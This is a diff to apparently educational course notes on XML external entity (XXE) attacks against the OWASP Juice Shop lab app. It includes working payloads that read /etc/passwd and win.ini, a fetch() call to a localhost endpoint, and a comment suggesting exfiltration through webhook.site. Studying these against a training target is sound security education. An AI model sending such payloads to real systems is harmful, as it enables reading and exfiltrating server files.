@@ -21,6 +21,14 @@
 </Wares>
 ```
 
+```xml
+<Wares>
+  <Item>Most Beautiful Apple (Limited Edition ™)</Item>
+  <Item>Highest Possible Mountain (Limited Edition ™)</Item>
+  <Item>Deepest Darkest Cave (Limited Edition ™)</Item>
+</Wares>
+```
+
 ```sh
 # Load unsafe.yml that enables XXE challenge
 # https://github.com/juice-shop/juice-shop/tree/master/config
@@ -45,7 +53,7 @@ var payload = `<?xml version="1.0"  encoding="UTF-8" ?>
   &xxe;
 </foo>`;
 
-fetch("http://localhost:3005/parser", {
+fetch("http://localhost:3003/changelog", {
   "headers": {
     "content-type": "text/xml",
     "sec-fetch-dest": "empty",
@@ -62,11 +70,11 @@ fetch("http://localhost:3005/parser", {
 ```
 
 ```xml
+<!-- Target: Linux -->
 <?xml version="1.0" ?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY>
-  <!ENTITY xxe SYSTEM
-  "file:///etc/passwd">
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <foo>
   &xxe;
@@ -74,11 +82,11 @@ fetch("http://localhost:3005/parser", {
 ```
 
 ```xml
+<!-- Target: Windows -->
 <?xml version="1.0" ?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY>
-  <!ENTITY xxe SYSTEM
-  "file:///c:/windows/win.ini">
+  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
 ]>
 <foo>
   &xxe;
@@ -86,6 +94,7 @@ fetch("http://localhost:3005/parser", {
 ```
 
 ```xml
+<!-- Direct call to webhook.site is an another way -->
 <?xml version="1.0" ?>
 <!DOCTYPE foo [
   <!ELEMENT foo ANY>
@@ -96,3 +105,9 @@ fetch("http://localhost:3005/parser", {
   &xxe;
 </foo>
 ```
+
+# Video 6.5
+
+* [GitHub: JuiceShop/fileUpload.ts](https://github.com/juice-shop/juice-shop/blob/master/routes/fileUpload.ts)
+* [CVE 2021-29447 report by Safe Security](https://www.safe.security/assets/img/research-paper/pdf/xml-external-entity-xxe-vulnerability-research-paper.pdf)
+* [X41 BeanStack: Java Fingerprinting using Stack Traces](https://beanstack.io/)
